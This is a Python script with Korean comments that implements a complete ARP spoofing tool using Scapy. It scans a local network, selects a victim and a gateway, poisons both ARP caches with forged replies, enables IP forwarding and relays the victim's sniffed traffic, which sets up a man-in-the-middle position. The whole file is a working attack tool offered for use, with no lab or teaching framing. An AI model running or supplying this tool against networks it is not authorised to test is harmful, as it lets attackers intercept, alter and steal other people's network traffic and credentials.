#!/usr/bin/env python3
# -*- coding: utf-8 -*-

"""
고급 ARP 스푸퍼 (ARP Spoofer)
이 스크립트는 Scapy를 사용하여 ARP 스푸핑 공격을 수행합니다.
네트워크 스캔, 대상 호스트 선택, ARP 스푸핑, 패킷 전달 기능을 제공합니다.
"""

import argparse
import time
import os
import sys
import signal
import threading
import logging
import ipaddress
from datetime import datetime
from scapy.all import *
from scapy.layers.l2 import ARP, Ether
from scapy.layers.inet import IP, TCP, UDP

# 로깅 설정
logging.basicConfig(
    level=logging.INFO,
    format='%(asctime)s - %(levelname)s - %(message)s',
    handlers=[
        logging.FileHandler("arp_spoof.log"),
        logging.StreamHandler()
    ]
)
logger = logging.getLogger("ARP_Spoofer")

# 전역 변수
target_ip = None
gateway_ip = None
target_mac = None
gateway_mac = None
interface = None
packet_count = 0
is_spoofing = False
spoof_thread = None
forward_thread = None

# ANSI 색상 코드
COLORS = {
    'HEADER': '\033[95m',
    'BLUE': '\033[94m',
    'GREEN': '\033[92m',
    'WARNING': '\033[93m',
    'RED': '\033[91m',
    'ENDC': '\033[0m',
    'BOLD': '\033[1m',
    'UNDERLINE': '\033[4m'
}

def print_colored(text, color):
    """색상이 지정된 텍스트 출력"""
    if os.name == 'nt':  # Windows에서는 ANSI 색상이 기본적으로 지원되지 않음
        print(text)
    else:
        print(f"{COLORS[color]}{text}{COLORS['ENDC']}")

def signal_handler(sig, frame):
    """Ctrl+C 시그널 처리"""
    print_colored("\n\n[*] ARP 스푸핑 중단 중...", 'WARNING')
    stop_spoofing()
    restore_network()
    print_colored(f"[+] 네트워크 상태가 복원되었습니다.", 'GREEN')
    sys.exit(0)

def get_mac(ip):
    """IP 주소로 MAC 주소 조회"""
    try:
        # ARP 요청 패킷 생성
        arp_request = ARP(pdst=ip)
        broadcast = Ether(dst="ff:ff:ff:ff:ff:ff")
        arp_request_broadcast = broadcast/arp_request
        
        # 응답 수신 (3번 시도)
        for _ in range(3):
            answered_list = srp(arp_request_broadcast, timeout=1, verbose=False, iface=interface)[0]
            if answered_list:
                return answered_list[0][1].hwsrc
            time.sleep(0.5)
        
        return None
    except Exception as e:
        logger.error(f"MAC 주소 조회 오류: {e}")
        return None

def scan_network(network):
    """네트워크 스캔하여 활성 호스트 찾기"""
    try:
        print_colored(f"[*] 네트워크 스캔 중: {network}", 'BLUE')
        
        # 네트워크 주소 파싱
        net = ipaddress.IPv4Network(network, strict=False)
        
        # ARP 요청 패킷 생성
        arp_request = ARP(pdst=str(net))
        broadcast = Ether(dst="ff:ff:ff:ff:ff:ff")
        arp_request_broadcast = broadcast/arp_request
        
        # 응답 수신
        answered_list = srp(arp_request_broadcast, timeout=2, verbose=False, iface=interface)[0]
        
        # 결과 처리
        hosts = []
        for sent, received in answered_list:
            hosts.append({'ip': received.psrc, 'mac': received.hwsrc})
        
        return hosts
    except Exception as e:
        logger.error(f"네트워크 스캔 오류: {e}")
        return []

def print_scan_result(hosts):
    """스캔 결과 출력"""
    print_colored("\n발견된 호스트:", 'HEADER')
    print_colored("IP\t\t\tMAC Address", 'HEADER')
    print_colored("-" * 40, 'HEADER')
    
    for host in hosts:
        print(f"{host['ip']}\t\t{host['mac']}")
    
    print_colored("-" * 40, 'HEADER')
    print_colored(f"총 {len(hosts)}개의 호스트 발견\n", 'HEADER')

def spoof(target_ip, target_mac, spoof_ip):
    """ARP 스푸핑 패킷 전송"""
    global packet_count
    
    # ARP 응답 패킷 생성 (타겟에게 게이트웨이인 척)
    packet = ARP(
        op=2,  # ARP 응답
        pdst=target_ip,  # 대상 IP
        hwdst=target_mac,  # 대상 MAC
        psrc=spoof_ip  # 위조할 IP (게이트웨이)
    )
    
    # 패킷 전송
    send(packet, verbose=False, iface=interface)
    packet_count += 1

def restore(destination_ip, destination_mac, source_ip, source_mac):
    """ARP 테이블 복구"""
    # 정상 ARP 응답 패킷 생성
    packet = ARP(
        op=2,  # ARP 응답
        pdst=destination_ip,
        hwdst=destination_mac,
        psrc=source_ip,
        hwsrc=source_mac
    )
    
    # 패킷 전송 (5번 전송하여 확실히 복구)
    send(packet, verbose=False, count=5, iface=interface)

def restore_network():
    """네트워크 상태 복구"""
    print_colored("[*] ARP 테이블 복구 중...", 'BLUE')
    
    # 대상 호스트의 ARP 테이블 복구
    restore(target_ip, target_mac, gateway_ip, gateway_mac)
    
    # 게이트웨이의 ARP 테이블 복구
    restore(gateway_ip, gateway_mac, target_ip, target_mac)

def spoof_thread_function():
    """ARP 스푸핑 스레드 함수"""
    global is_spoofing
    
    print_colored("[*] ARP 스푸핑 시작...", 'GREEN')
    
    try:
        while is_spoofing:
            # 대상에게 게이트웨이인 척
            spoof(target_ip, target_mac, gateway_ip)
            
            # 게이트웨이에게 대상인 척
            spoof(gateway_ip, gateway_mac, target_ip)
            
            # 상태 출력 (100개 패킷마다)
            if packet_count % 100 == 0:
                print_colored(f"[*] 전송된 패킷: {packet_count}", 'BLUE')
            
            # 2초 대기
            time.sleep(2)
    except Exception as e:
        logger.error(f"스푸핑 오류: {e}")
        is_spoofing = False

def packet_forward(packet):
    """패킷 전달 함수"""
    if not packet.haslayer(IP):
        return
    
    # IP 패킷 처리
    ip_packet = packet[IP]
    
    # 대상 <-> 게이트웨이 간 패킷만 처리
    if (ip_packet.src == target_ip and ip_packet.dst != gateway_ip) or \
       (ip_packet.dst == target_ip and ip_packet.src != gateway_ip):
        # 패킷 전달
        send(ip_packet, verbose=False, iface=interface)

def forward_thread_function():
    """패킷 전달 스레드 함수"""
    try:
        # 패킷 캡처 및 전달
        sniff(
            filter=f"host {target_ip}",
            prn=packet_forward,
            store=0,
            iface=interface
        )
    except Exception as e:
        logger.error(f"패킷 전달 오류: {e}")

def check_ip_forwarding():
    """IP 포워딩 상태 확인 및 활성화"""
    try:
        # Linux 시스템에서 IP 포워딩 상태 확인
        with open('/proc/sys/net/ipv4/ip_forward', 'r') as f:
            if f.read().strip() == '1':
                print_colored("[+] IP 포워딩이 이미 활성화되어 있습니다.", 'GREEN')
                return True
        
        # IP 포워딩 활성화
        print_colored("[*] IP 포워딩 활성화 중...", 'BLUE')
        os.system('sudo sysctl -w net.ipv4.ip_forward=1')
        
        # 다시 확인
        with open('/proc/sys/net/ipv4/ip_forward', 'r') as f:
            if f.read().strip() == '1':
                print_colored("[+] IP 포워딩이 활성화되었습니다.", 'GREEN')
                return True
            else:
                print_colored("[!] IP 포워딩 활성화 실패. 수동으로 활성화하세요:", 'RED')
                print_colored("    sudo sysctl -w net.ipv4.ip_forward=1", 'RED')
                return False
    except Exception as e:
        print_colored(f"[!] IP 포워딩 설정 오류: {e}", 'RED')
        print_colored("    수동으로 활성화하세요: sudo sysctl -w net.ipv4.ip_forward=1", 'RED')
        return False

def start_spoofing():
    """ARP 스푸핑 시작"""
    global is_spoofing, spoof_thread, forward_thread
    
    # IP 포워딩 확인
    if not check_ip_forwarding():
        return False
    
    # 스레드 시작
    is_spoofing = True
    
    # ARP 스푸핑 스레드
    spoof_thread = threading.Thread(target=spoof_thread_function)
    spoof_thread.daemon = True
    spoof_thread.start()
    
    # 패킷 전달 스레드
    forward_thread = threading.Thread(target=forward_thread_function)
    forward_thread.daemon = True
    forward_thread.start()
    
    return True

def stop_spoofing():
    """ARP 스푸핑 중지"""
    global is_spoofing
    
    is_spoofing = False
    
    # 스레드가 종료될 때까지 대기
    if spoof_thread and spoof_thread.is_alive():
        spoof_thread.join(timeout=2)
    
    if forward_thread and forward_thread.is_alive():
        forward_thread.join(timeout=2)

def interactive_mode():
    """대화형 모드"""
    global target_ip, gateway_ip, target_mac, gateway_mac
    
    print_colored("\n=== 대화형 ARP 스푸핑 도구 ===", 'HEADER')
    
    # 네트워크 인터페이스 선택
    interfaces = get_if_list()
    print_colored("\n사용 가능한 네트워크 인터페이스:", 'BLUE')
    for i, iface in enumerate(interfaces):
        print(f"{i+1}. {iface}")
    
    while True:
        try:
            choice = int(input("\n인터페이스 번호 선택: "))
            if 1 <= choice <= len(interfaces):
                interface = interfaces[choice-1]
                break
            else:
                print_colored("잘못된 선택입니다. 다시 시도하세요.", 'RED')
        except ValueError:
            print_colored("숫자를 입력하세요.", 'RED')
    
    # 네트워크 스캔
    while True:
        network = input("\n스캔할 네트워크 (예: 192.168.1.0/24): ")
        try:
            ipaddress.IPv4Network(network, strict=False)
            break
        except ValueError:
            print_colored("잘못된 네트워크 주소입니다. 다시 시도하세요.", 'RED')
    
    hosts = scan_network(network)
    
    if not hosts:
        print_colored("호스트를 찾을 수 없습니다. 프로그램을 종료합니다.", 'RED')
        return
    
    print_scan_result(hosts)
    
    # 대상 호스트 선택
    while True:
        target_ip = input("\n대상 호스트 IP 선택: ")
        target_found = False
        
        for host in hosts:
            if host['ip'] == target_ip:
                target_mac = host['mac']
                target_found = True
                break
        
        if target_found:
            break
        else:
            print_colored("선택한 IP 주소가 스캔 결과에 없습니다. 다시 시도하세요.", 'RED')
    
    # 게이트웨이 선택
    while True:
        gateway_ip = input("\n게이트웨이 IP 선택: ")
        gateway_found = False
        
        for host in hosts:
            if host['ip'] == gateway_ip:
                gateway_mac = host['mac']
                gateway_found = True
                break
        
        if gateway_found:
            break
        else:
            print_colored("선택한 IP 주소가 스캔 결과에 없습니다. 다시 시도하세요.", 'RED')
    
    # 스푸핑 시작
    print_colored(f"\n[*] 대상: {target_ip} ({target_mac})", 'BLUE')
    print_colored(f"[*] 게이트웨이: {gateway_ip} ({gateway_mac})", 'BLUE')
    
    start = input("\nARP 스푸핑을 시작하시겠습니까? (y/n): ")
    if start.lower() == 'y':
        if start_spoofing():
            print_colored("\n[*] ARP 스푸핑이 실행 중입니다. Ctrl+C로 중지할 수 있습니다.", 'GREEN')
            
            try:
                while True:
                    time.sleep(1)
            except KeyboardInterrupt:
                print_colored("\n\n[*] 사용자에 의해 중단되었습니다.", 'WARNING')
                stop_spoofing()
                restore_network()
    else:
        print_colored("\n[*] 프로그램을 종료합니다.", 'BLUE')

def main():
    global target_ip, gateway_ip, target_mac, gateway_mac, interface
    
    # 명령행 인자 파싱
    parser = argparse.ArgumentParser(description='고급 ARP 스푸퍼')
    parser.add_argument('-i', '--interface', help='사용할 네트워크 인터페이스')
    parser.add_argument('-t', '--target', help='대상 호스트 IP')
    parser.add_argument('-g', '--gateway', help='게이트웨이 IP')
    parser.add_argument('-s', '--scan', help='네트워크 스캔 (예: 192.168.1.0/24)')
    parser.add_argument('--interactive', action='store_true', help='대화형 모드 실행')
    args = parser.parse_args()
    
    # Ctrl+C 시그널 핸들러 등록
    signal.signal(signal.SIGINT, signal_handler)
    
    # 시작 메시지
    print_colored("=" * 60, 'HEADER')
    print_colored(" 고급 ARP 스푸퍼 시작", 'HEADER')
    print_colored("=" * 60, 'HEADER')
    
    # 대화형 모드
    if args.interactive:
        interactive_mode()
        return
    
    # 인터페이스 설정
    if args.interface:
        interface = args.interface
    else:
        # 기본 인터페이스 사용
        interface = conf.iface
    
    print_colored(f"[*] 사용 인터페이스: {interface}", 'BLUE')
    
    # 네트워크 스캔
    if args.scan:
        hosts = scan_network(args.scan)
        if hosts:
            print_scan_result(hosts)
        else:
            print_colored("[!] 호스트를 찾을 수 없습니다.", 'RED')
        return
    
    # 대상 및 게이트웨이 설정
    if not args.target or not args.gateway:
        print_colored("[!] 대상 호스트와 게이트웨이 IP를 모두 지정해야 합니다.", 'RED')
        print_colored("    예: python3 arp_spoofer.py -t 192.168.1.100 -g 192.168.1.1", 'RED')
        return
    
    target_ip = args.target
    gateway_ip = args.gateway
    
    # MAC 주소 조회
    print_colored(f"[*] 대상 MAC 주소 조회 중: {target_ip}", 'BLUE')
    target_mac = get_mac(target_ip)
    if not target_mac:
        print_colored(f"[!] {target_ip}의 MAC 주소를 찾을 수 없습니다.", 'RED')
        return
    
    print_colored(f"[*] 게이트웨이 MAC 주소 조회 중: {gateway_ip}", 'BLUE')
    gateway_mac = get_mac(gateway_ip)
    if not gateway_mac:
        print_colored(f"[!] {gateway_ip}의 MAC 주소를 찾을 수 없습니다.", 'RED')
        return
    
    print_colored(f"[+] 대상: {target_ip} ({target_mac})", 'GREEN')
    print_colored(f"[+] 게이트웨이: {gateway_ip} ({gateway_mac})", 'GREEN')
    
    # ARP 스푸핑 시작
    if start_spoofing():
        try:
            print_colored("[*] ARP 스푸핑이 실행 중입니다. Ctrl+C로 중지할 수 있습니다.", 'GREEN')
            while True:
                time.sleep(1)
        except KeyboardInterrupt:
            print_colored("\n[*] 사용자에 의해 중단되었습니다.", 'WARNING')
            stop_spoofing()
            restore_network()
            print_colored("[+] 프로그램이 종료되었습니다.", 'GREEN')

if __name__ == "__main__":
    main()
